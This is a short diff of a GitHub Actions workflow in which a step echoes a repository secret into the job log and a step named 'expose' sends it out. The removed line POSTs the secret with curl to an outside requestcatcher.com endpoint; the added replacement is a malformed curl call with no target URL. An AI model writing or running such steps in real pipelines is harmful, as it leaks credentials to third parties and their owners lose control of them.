@@ -24,6 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run:  echo ${{ secrets.FAVOURITE }}
-
+        
       - name: expose
-        run:  curl -X POST -d '${{ secrets.FAVOURITE }}' https://synchro1603.requestcatcher.com/test
+        run:  curl POST -H "X-API-Key: $secrets.FAVOURITE"
